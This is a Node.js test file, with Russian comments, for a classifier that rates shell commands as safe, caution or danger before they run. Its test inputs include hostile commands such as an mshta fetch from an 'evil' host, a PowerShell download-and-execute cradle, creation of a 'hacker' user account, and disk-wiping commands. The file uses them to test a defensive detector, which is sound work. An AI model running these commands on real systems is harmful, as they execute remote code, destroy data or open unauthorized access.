'use strict';
// Классификатор опасных команд (src/runlangs.js, ТЗ C3 §6).
// Одна функция на main и renderer: от неё зависят бейдж карточки предложения и
// требование подтверждения перед запуском — ошибки здесь стоят дороже всего этапа.
const test = require('node:test');
const assert = require('node:assert/strict');

const { classifyCommand } = require('../src/runlangs');

const level = (cmd) => classifyCommand(cmd).level;
const reasons = (cmd) => classifyCommand(cmd).reasons;

test('classify: чтение и поиск — safe, без причин', () => {
  for (const cmd of [
    'grep -rn "class Player" src',
    'dir /s /b',
    'ls -la',
    'type main.py',
    'cat README.md',
    'find . -name "*.gd"',
    'findstr /n TODO src\\main.cpp',
    'where python',
    'head -20 log.txt',
    'tail -f out.log',
    'wc -l src/*.js',
    'echo hello',
    'python main.py',
    'node script.js',
    'java -version',
    'git status',
    'git log --oneline -5',
    'git diff HEAD',
    'git branch',          // список веток — чтение
    '',
    '   ',
  ]) {
    const r = classifyCommand(cmd);
    assert.equal(r.level, 'safe', `ожидался safe для «${cmd}», причины: ${r.reasons.join('; ')}`);
    assert.deepEqual(r.reasons, []);
  }
});

test('classify: удаление — danger', () => {
  for (const cmd of [
    'rm file.txt',
    'rm -r build',
    'rmdir /s /q build',
    'rd /s build',
    'del /f /q *.tmp',
    'erase old.txt',
    'unlink gone.txt',
    'shred -u secret.txt',
    'Remove-Item -Recurse dist',
  ]) {
    assert.equal(level(cmd), 'danger', `ожидался danger для «${cmd}»`);
  }
});

test('classify: git-мутации — push/clean/reset/rebase/filter-branch danger, commit/merge caution', () => {
  assert.equal(level('git push'), 'danger');
  assert.equal(level('git push origin main'), 'danger');
  assert.equal(level('git clean -fd'), 'danger');
  assert.equal(level('git reset --hard HEAD~1'), 'danger');
  assert.equal(level('git rebase main'), 'danger');
  assert.equal(level('git filter-branch --all'), 'danger');
  assert.equal(level('git checkout -- .'), 'danger', 'откат рабочих правок');
  assert.equal(level('git restore src'), 'danger');
  assert.equal(level('git branch -D feature'), 'danger');
  // обратимое — «осторожно»
  assert.equal(level('git commit -m "fix"'), 'caution');
  assert.equal(level('git merge feature'), 'caution');
  assert.equal(level('git stash drop'), 'danger', 'потеря отложенных изменений');
  assert.equal(level('git stash'), 'caution');
  assert.equal(level('git tag -d v1'), 'caution');
  assert.equal(level('git checkout main'), 'caution');
  // reset без --hard всё равно danger: потеря коммитов индекса
  assert.equal(level('git reset HEAD~1'), 'danger');
});

test('classify: система и реестр — danger', () => {
  for (const cmd of [
    'format C:',
    'mkfs.ext4 /dev/sda1',
    'fdisk /dev/sda',
    'diskpart',
    'shutdown /s /t 0',
    'reboot',
    'halt',
    'reg add HKLM\\Software /v x',
    'reg delete HKCU\\Software\\x',
    'sc create evil binPath= x.exe',
    'schtasks /create /tn x',
    'crontab -r',
    'Set-ExecutionPolicy Unrestricted',
    'net user hacker pass /add',
    'takeown /f C:\\Windows',
    'icacls C:\\ /grant Everyone:F',
  ]) {
    assert.equal(level(cmd), 'danger', `ожидался danger для «${cmd}»`);
  }
  // reg query — чтение реестра, не danger
  assert.notEqual(level('reg query HKLM\\Software'), 'danger');
});

test('classify: обёртки и обфускация — danger', () => {
  for (const cmd of [
    'mshta http://evil/x.hta',
    'rundll32 evil.dll,main',
    'wscript script.vbs',
    'cscript script.js',
    'eval "$payload"',
    'Invoke-Expression "rm x"',
    'iex (new-object net.webclient).downloadstring($u)',
    'powershell -enc SQBFAFgA',
    'powershell -EncodedCommand SQBFAFgA',
  ]) {
    assert.equal(level(cmd), 'danger', `ожидался danger для «${cmd}»`);
  }
});

test('classify: опасные флаги делают danger любую команду', () => {
  assert.equal(level('npm ci --force'), 'danger');
  assert.equal(level('cp -rf a b'), 'danger');
  assert.equal(level('cp -fr a b'), 'danger');
  assert.equal(level('rm --no-preserve-root /'), 'danger');
  assert.equal(level('git reset --hard'), 'danger');
  // регистр флага не важен
  assert.equal(level('NPM CI --FORCE'), 'danger');
});

test('classify: установка, сеть, процессы — caution без confirm', () => {
  for (const cmd of [
    'pip install requests',
    'pip3 install -r req.txt',
    'npm install',
    'npm i lodash',
    'npm uninstall x',
    'npx create-react-app demo',
    'yarn add left-pad',
    'pnpm add vite',
    'apt install gcc',
    'apt-get update',
    'dnf install nodejs',
    'yum update',
    'pacman -S gcc',
    'brew install wget',
    'choco install git',
    'winget install Python',
    'scoop install ripgrep',
    'curl https://example.com -o f',
    'wget https://example.com/f',
    'Invoke-WebRequest https://x',
    'scp f user@host:/tmp',
    'ssh user@host',
    'telnet host 80',
    'taskkill /im x.exe',
    'kill 1234',
    'killall node',
    'pkill -f script',
    'chmod +x run.sh',
    'chown root x',
    'start "" app.exe',
  ]) {
    assert.equal(level(cmd), 'caution', `ожидался caution для «${cmd}»`);
  }
});

test('classify: сегменты — уровень команды это максимум сегментов', () => {
  // чтение + удаление = danger
  const r = classifyCommand('grep x src && rm -r build');
  assert.equal(r.level, 'danger');
  assert.ok(r.reasons.length >= 1);
  // caution + safe = caution
  assert.equal(level('dir && npm install'), 'caution');
  // danger перекрывает caution в любом порядке
  assert.equal(level('pip install x; rmdir /s y'), 'danger');
  // все разделители из ТЗ: && || | ; и перевод строки
  assert.equal(level('cat a || rm b'), 'danger');
  assert.equal(level('cat a | rm b'), 'danger');
  assert.equal(level('cat a\nrm b'), 'danger');
  // одиночный & (cmd) тоже разделитель
  assert.equal(level('dir & del x'), 'danger');
});

test('classify: кавычки — разделители внутри кавычек не режут команду', () => {
  // «&& rm» внутри строки поиска — аргумент findstr, а не вторая команда
  const r = classifyCommand('findstr "a && rm -rf" notes.txt');
  assert.equal(r.level, 'safe', `причины: ${r.reasons.join('; ')}`);
  const r2 = classifyCommand('grep "x | y" file.txt');
  assert.equal(r2.level, 'safe');
});

test('classify: путь и расширение исполняемого не маскируют команду', () => {
  assert.equal(level('C:\\tools\\rm.exe -rf x'), 'danger');
  assert.equal(level('/usr/bin/rm file'), 'danger');
  assert.equal(level('./build/clean.cmd'), 'safe', 'clean.cmd — не git clean, а обычный скрипт');
  assert.equal(level('/opt/bin/curl x'), 'caution');
});

test('classify: регистр команды не важен', () => {
  assert.equal(level('RM -rf x'), 'danger');
  assert.equal(level('Git Push origin main'), 'danger');
  assert.equal(level('NPM INSTALL'), 'caution');
});

test('classify: причины перечислены и не повторяются', () => {
  const r = classifyCommand('rm a && rm b');
  assert.equal(r.level, 'danger');
  // одно и то же срабатывание в двух сегментах не дублируется в причинах
  assert.equal(r.reasons.length, 1);
  assert.match(r.reasons[0], /rm/);
  // несколько разных причин — все перечислены
  const r2 = classifyCommand('git push && pip install x');
  assert.equal(r2.level, 'danger');
  assert.ok(r2.reasons.length >= 2);
});

test('classify: мусор на входе не роняет', () => {
  assert.equal(level(null), 'safe');
  assert.equal(level(undefined), 'safe');
  assert.equal(level(42), 'safe');
  // platform принимается, но списки пока общие (задел на будущее)
  assert.equal(classifyCommand('rm x', 'win32').level, 'danger');
  assert.equal(classifyCommand('ls', 'linux').level, 'safe');
});

test('classify: pip без install — не caution (справка и список пакетов безопасны)', () => {
  assert.equal(level('pip list'), 'safe');
  assert.equal(level('pip --help'), 'safe');
  assert.equal(level('pip install x'), 'caution');
});
